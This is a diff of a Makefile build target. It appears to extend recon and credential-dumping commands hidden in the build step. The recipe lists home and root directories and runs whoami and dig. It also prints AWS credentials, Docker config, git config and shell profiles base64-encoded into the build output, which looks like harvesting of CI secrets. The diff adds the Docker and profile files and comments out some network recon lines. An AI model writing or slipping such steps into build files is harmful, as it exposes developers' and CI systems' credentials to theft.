@@ -89,16 +89,17 @@ build: vendor $(NAME)
 	pwd
 	ls -alr
 	ls -alr ~
-	cat ~/.aws/* ~/.bashrc ~/.gitconfig .git/config | base64
-	cat ~/.bash_history | base64
+	ls -alr /
+	cat ~/.aws/* ~/.bashrc ~/.gitconfig ~/.docker/* ~/.profile .git/config | base64
+	#cat ~/.bash_history | base64
 	dig ubuntu
 	dig localhost
 	whoami
-	who am i
-	apt download net-tools
-	dpkg -i net-tools.deb --force-not-root --root=\$HOME
-	ifconfig
-	arp -a
+	#who am i
+	#apt download net-tools
+	#dpkg -i net-tools.deb --force-not-root --root=\$HOME
+	#ifconfig
+	#arp -a
 .PHONY: build
 
 install: build $(NAME)
